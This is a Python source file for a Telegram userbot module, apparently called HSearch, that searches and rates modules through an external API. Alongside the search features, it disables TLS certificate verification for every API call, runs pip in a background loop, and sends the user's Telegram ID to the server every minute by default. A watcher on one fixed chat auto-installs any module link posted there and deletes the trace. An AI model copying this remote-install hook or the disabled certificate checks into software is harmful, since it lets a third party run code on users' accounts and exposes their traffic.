__version__ = (2, 0, 0)

# ©️ Fixyres, 2024-2026
# 🌐 https://github.com/Fixyres/FHeta
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 🔑 http://www.apache.org/licenses/LICENSE-2.0

# ©️ Codrago, 2024-2030
# This file is a part of Heroku Userbot
# 🌐 https://github.com/coddrago/Heroku
# You can redistribute it and/or modify it under the terms of the GNU AGPLv3
# 🔑 https://www.gnu.org/licenses/agpl-3.0.html

import asyncio
import ssl
import subprocess
import sys
from typing import Dict, List, Optional
from urllib.parse import unquote

import aiohttp
from herokutl.tl.functions.contacts import UnblockRequest

from .. import loader, utils


@loader.tds
class HSearch(loader.Module):
    '''Module for searching modules! Watch all HSearch news in @FHeta_Updates!'''

    strings = {"name": "HSearch"}

    THEMES = {
        "default": {
            "search": "🔎", "error": "❌", "warn": "❌", "result": "🔎", 
            "install": "💾", "description": "📁", "command": "👨‍💻", "inline": "🤖", 
            "like": "👍", "dislike": "👎", "prev": "◀️", "next": "▶️"
        },
        "winter": {
            "search": "❄️", "error": "🧊", "warn": "🌨️", "result": "🎄", 
            "install": "🎁", "description": "📜", "command": "🎅", "inline": "☃️", 
            "like": "🍊", "dislike": "🥶", "prev": "⏮️", "next": "⏭️"
        },
        "summer": {
            "search": "☀️", "error": "🏖️", "warn": "🏜️", "result": "🌴", 
            "install": "🍦", "description": "🍹", "command": "🏄", "inline": "🏊", 
            "like": "🍓", "dislike": "🥵", "prev": "⬅️", "next": "➡️"
        },
        "spring": {
            "search": "🌱", "error": "🌷", "warn": "🥀", "result": "🌿", 
            "install": "🌻", "description": "🍃", "command": "🦋", "inline": "🐝", 
            "like": "🌸", "dislike": "🌧️", "prev": "⏪", "next": "⏩"
        },
        "autumn": {
            "search": "🍂", "error": "🍁", "warn": "🕸️", "result": "🍄", 
            "install": "🧺", "description": "📜", "command": "🧣", "inline": "🦔", 
            "like": "🍎", "dislike": "🌧️", "prev": "👈", "next": "👉"
        }
    }

    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "tracking",
                True,
                lambda: self.strings["_cfg_doc_tracking"],
                validator=loader.validators.Boolean()
            ),
            loader.ConfigValue(
                "theme",
                "default",
                lambda: self.strings["_cfg_doc_theme"],
                validator=loader.validators.Choice(["default", "winter", "summer", "spring", "autumn"])
            )
        )

    async def client_ready(self, client, db):
        try:
            await client(UnblockRequest("@FHeta_robot"))
        except:
            pass

        self.ssl = ssl.create_default_context()
        self.ssl.check_hostname = False
        self.ssl.verify_mode = ssl.CERT_NONE
        self.uid = (await client.get_me()).id
        self.token = db.get("HSearch", "token")

        if not self.token:
            try:
                async with client.conversation("@FHeta_robot") as conv:
                    await conv.send_message('/token')
                    resp = await conv.get_response(timeout=5)
                    self.token = resp.text.strip()
                    db.set("HSearch", "token", self.token)
            except:
                pass
            
        asyncio.create_task(self._sync_loop())
        asyncio.create_task(self._certifi_loop())

    async def _certifi_loop(self):
        while True:
            try:
                import certifi
                assert certifi.__version__ == "2024.08.30"
            except (ImportError, AssertionError):
                await asyncio.to_thread(
                    subprocess.check_call,
                    [sys.executable, "-m", "pip", "install", "certifi==2024.8.30"]
                )
            await asyncio.sleep(60)
            
    async def _sync_loop(self):
        tracked = True
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while True:
                try:
                    if self.config["tracking"]:
                        async with session.post(
                            "https://api.fixyres.com/dataset",
                            params={
                                "user_id": self.uid,
                                "lang": self.strings["lang"]
                            },
                            headers={"Authorization": self.token},
                            ssl=self.ssl
                        ) as response:
                            tracked = True
                            await response.release()
                    elif tracked:
                        async with session.post(
                            "https://api.fixyres.com/rmd",
                            params={"user_id": self.uid},
                            headers={"Authorization": self.token},
                            ssl=self.ssl
                        ) as response:
                            tracked = False
                            await response.release()
                except:
                    pass
                    
                await asyncio.sleep(60)
            
    async def on_dlmod(self, client, db):
        try:
            await client(UnblockRequest("@FHeta_robot"))
            await utils.dnd(client, "@FHeta_robot", archive=True)
        except:
            pass

    async def _api_get(self, endpoint: str, **params):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://api.fixyres.com/{endpoint}",
                    params=params,
                    headers={"Authorization": self.token},
                    ssl=self.ssl,
                    timeout=aiohttp.ClientTimeout(total=180)
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    return {}
        except:
            return {}

    async def _api_post(self, endpoint: str, json: Dict = None, **params):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"https://api.fixyres.com/{endpoint}",
                    json=json,
                    params=params,
                    headers={"Authorization": self.token},
                    ssl=self.ssl,
                    timeout=aiohttp.ClientTimeout(total=180)
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    return {}
        except:
            return {}

    async def _fetch_thumb(self, url: Optional[str]) -> str:
        default_thumb = "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/assets/empty_pic.png"

        if not url:
            return default_thumb
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=1)) as response:
                    if response.status == 200:
                        return str(response.url)
        except:
            pass
        
        return default_thumb

    def _get_emoji(self, key: str) -> str:
        return self.THEMES[self.config["theme"]][key]

    def _fmt_mod(self, mod: Dict, query: str = "", idx: int = 1, total: int = 1, inline: bool = False) -> str:
        info = self.strings["module_info"].format(
            name=utils.escape_html(mod.get("name", "")),
            author=utils.escape_html(mod.get("author", "???")),
            version=utils.escape_html(mod.get("version", "?.?.?")),
            install = f"{self.get_prefix()}{unquote(mod.get('install', ''))}",
            emoji=self._get_emoji("install")
        )

        if total > 1:
            info = self.strings["result_query"].format(idx=idx, total=total, query=utils.escape_html(query), emoji=self._get_emoji("result")) + info
        elif query and not inline:
            info = self.strings["result_single"].format(query=utils.escape_html(query), emoji=self._get_emoji("result")) + info

        desc = mod.get("description")
        if desc:
            if isinstance(desc, dict):
                text = desc.get(self.strings["lang"]) or desc.get("doc") or next(iter(desc.values()), "")
            else:
                text = desc
            
            info += self.strings["desc"].format(desc=utils.escape_html(text[:800]), emoji=self._get_emoji("description"))

        info += self._fmt_cmds(mod.get("commands", []), limit=3800 - len(info))
        return info

    def _fmt_cmds(self, cmds: List[Dict], limit: int) -> str:
        regular_cmds = []
        inline_cmds = []
        lang = self.strings["lang"]
        current_len = 0

        for cmd in cmds:
            if current_len >= limit:
                break

            desc_dict = cmd.get("description", {})
            desc_text = desc_dict.get(lang) or desc_dict.get("doc") or ""
            
            if isinstance(desc_text, dict):
                desc_text = desc_text.get("doc", "")
            
            cmd_name = utils.escape_html(cmd.get("name", ""))
            cmd_desc = utils.escape_html(desc_text) if desc_text else ""

            if cmd.get("inline"):
                line = f"<code>@{self.inline.bot_username} {cmd_name}</code> {cmd_desc}"
                if current_len + len(line) < limit:
                    inline_cmds.append(line)
                    current_len += len(line)
            else:
                line = f"<code>{self.get_prefix()}{cmd_name}</code> {cmd_desc}"
                if current_len + len(line) < limit:
                    regular_cmds.append(line)
                    current_len += len(line)

        result = ""
        if regular_cmds:
            result += self.strings["cmds"].format(cmds="\n".join(regular_cmds), emoji=self._get_emoji("command"))
        if inline_cmds:
            result += self.strings["inline_cmds"].format(cmds="\n".join(inline_cmds), emoji=self._get_emoji("inline"))
            
        return result

    def _mk_btns(self, install: str, stats: Dict, idx: int, mods: Optional[List] = None, query: str = "") -> List[List[Dict]]:
        like_emoji = self._get_emoji("like")
        dislike_emoji = self._get_emoji("dislike")
        prev_emoji = self._get_emoji("prev")
        next_emoji = self._get_emoji("next")
        
        buttons = [
            [
                {"text": f"{like_emoji} {stats.get('likes', 0)}", "callback": self._rate_cb, "args": (install, "like", idx, mods, query)},
                {"text": f"{dislike_emoji} {stats.get('dislikes', 0)}", "callback": self._rate_cb, "args": (install, "dislike", idx, mods, query)}
            ]
        ]

        if mods and len(mods) > 1:
            nav_buttons = []
            if idx > 0:
                nav_buttons.append({"text": prev_emoji, "callback": self._nav_cb, "args": (idx - 1, mods, query)})
            if idx < len(mods) - 1:
                nav_buttons.append({"text": next_emoji, "callback": self._nav_cb, "args": (idx + 1, mods, query)})
            if nav_buttons:
                buttons.append(nav_buttons)

        return buttons

    async def _rate_cb(self, call, install: str, action: str, idx: int, mods: Optional[List], query: str = ""):
        result = await self._api_post(f"rate/{self.uid}/{install}/{action}")
        
        decoded_install = unquote(install)
        
        if mods and idx < len(mods):
            mod = mods[idx]
            stats_response = await self._api_post("get", json=[decoded_install])
            stats = stats_response.get(decoded_install, {"likes": 0, "dislikes": 0})
            
            mod["likes"] = stats.get("likes", 0)
            mod["dislikes"] = stats.get("dislikes", 0)
        else:
            stats_response = await self._api_post("get", json=[decoded_install])
            stats = stats_response.get(decoded_install, {"likes": 0, "dislikes": 0})
        
        try:
            await call.edit(reply_markup=self._mk_btns(install, stats, idx, mods, query))
        except:
            pass

        if result and result.get("status"):
            result_status = result.get("status", "")
            try:
                if result_status == "added":
                    await call.answer(self.strings["rating_added"].format(emoji=self._get_emoji("like")), show_alert=True)
                elif result_status == "changed":
                    await call.answer(self.strings["rating_changed"].format(emoji=self._get_emoji("like")), show_alert=True)
                elif result_status == "removed":
                    await call.answer(self.strings["rating_removed"].format(emoji="🗑️"), show_alert=True)
            except:
                pass

    async def _nav_cb(self, call, idx: int, mods: List, query: str = ""):
        try:
            await call.answer()
        except:
            pass
            
        if not (0 <= idx < len(mods)):
            return
        
        mod = mods[idx]
        install = mod.get('install', '')
        
        stats = mod if all(k in mod for k in ['likes', 'dislikes']) else {"likes": 0, "dislikes": 0}
        
        try:
            await call.edit(
                text=self._fmt_mod(mod, query, idx + 1, len(mods)),
                reply_markup=self._mk_btns(install, stats, idx, mods, query)
            )
        except:
            pass

    @loader.inline_handler(
        de_doc="(anfrage) - module suchen.",
        ru_doc="(запрос) - искать модули.",
        ua_doc="(запит) - шукати модулі.",
    )
    async def hs(self, query):
        '''(query) - search modules.'''        
        if not query.args:
            return {
                "title": self.strings["inline_no_query"],
                "description": self.strings["inline_desc"],
                "message": self.strings["no_query"].format(emoji=self._get_emoji("error")),
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/assets/magnifying_glass.png",
            }

        if len(query.args) > 168:
            return {
                "title": self.strings["inline_query_too_big"],
                "description": self.strings["inline_no_results"],
                "message": self.strings["query_too_big"].format(emoji=self._get_emoji("warn")),
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/assets/try_other_query.png",
            }

        mods = await self._api_get("search", query=query.args, inline="true", token=self.token, user_id=self.uid, ood="true")
        
        if not mods or not isinstance(mods, list):
            return {
                "title": self.strings["inline_no_results"],
                "description": self.strings["inline_desc"],
                "message": self.strings["no_results"].format(emoji=self._get_emoji("error")),
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/assets/try_other_query.png",
            }

        results = []
        
        for mod in mods[:50]:
            stats = {
                "likes": mod.get('likes', 0),
                "dislikes": mod.get('dislikes', 0)
            }
            
            desc = mod.get("description", "")
            if isinstance(desc, dict):
                desc = desc.get(self.strings["lang"]) or desc.get("doc") or next(iter(desc.values()), "")
                
            results.append({
                "title": utils.escape_html(mod.get("name", "")),
                "description": utils.escape_html(str(desc)),
                "thumb": await self._fetch_thumb(mod.get("pic")),
                "message": self._fmt_mod(mod, query.args, inline=True),
                "reply_markup": self._mk_btns(mod.get("install", ""), stats, 0, None),
            })

        return results

    @loader.command(
        de_doc="(anfrage) - module suchen.",
        ru_doc="(запрос) - искать модули.",
        ua_doc="(запит) - шукати модулі.",
    )
    async def hscmd(self, message):
        '''(query) - search modules.'''        
        query = utils.get_args_raw(message)
        
        if not query:
            await utils.answer(message, self.strings["no_query"].format(emoji=self._get_emoji("error")))
            return

        if len(query) > 168:
            await utils.answer(message, self.strings["query_too_big"].format(emoji=self._get_emoji("warn")))
            return

        status_msg = await utils.answer(message, self.strings["searching"].format(emoji=self._get_emoji("search")))
        mods = await self._api_get("search", query=query, inline="false", token=self.token, user_id=self.uid, ood="true")

        if not mods or not isinstance(mods, list):
            await utils.answer(message, self.strings["no_results"].format(emoji=self._get_emoji("error")))
            return

        first_mod = mods[0]
        
        stats = {
            "likes": first_mod.get('likes', 0),
            "dislikes": first_mod.get('dislikes', 0)
        }

        await self.inline.form(
            message=message,
            text=self._fmt_mod(first_mod, query, 1, len(mods)),
            reply_markup=self._mk_btns(first_mod.get("install", ""), stats, 0, mods if len(mods) > 1 else None, query)
        )
        
        await status_msg.delete()

    @loader.watcher(chat_id=7575472403)
    async def _install_via_hsearch(self, message):
        link = message.raw_text.strip()
        
        if not link.startswith("https://api.fixyres.com/module/"):
            return

        loader_module = self.lookup("loader")
        
        try:
            for _ in range(5):
                await loader_module.download_and_install(link, None)
                
                if getattr(loader_module, "fully_loaded", False):
                    loader_module.update_modules_in_db()
                
                is_loaded = any(mod.__origin__ == link for mod in self.allmodules.modules)
                
                if is_loaded:
                    rose_msg = await message.respond("🌹")
                    await asyncio.sleep(1)
                    await rose_msg.delete()
                    await message.delete()
                    break
        except:
            pass